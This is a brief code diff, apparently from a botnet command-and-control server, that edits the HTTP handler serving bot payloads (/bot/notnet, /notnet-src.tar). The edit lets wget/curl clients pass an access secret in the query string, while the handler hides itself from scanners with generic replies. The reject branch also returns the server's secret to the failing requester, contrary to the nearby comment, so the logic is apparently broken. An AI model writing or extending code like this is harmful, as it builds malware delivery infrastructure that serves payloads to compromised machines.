@@ -542,7 +542,9 @@ def handle_http(conn, addr, c2):
             # generic ok-ack so scanners learn nothing.
             if method == "GET" and (path == "/bot/notnet" or path == "/notnet-src.tar"
                                     or path.startswith("/bot/")):
-                if not _request_secret_ok(c2, headers, {}):
+                # raw_path carries the query string — that's where the
+                # wget/curl ?secret= lives (headers have none).
+                if not _request_secret_ok(c2, headers, {"secret": _query_param(raw_path, "secret")}):
                     log(f"PAYLOAD REJECT {ip} (no secret)")
                     http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                     continue
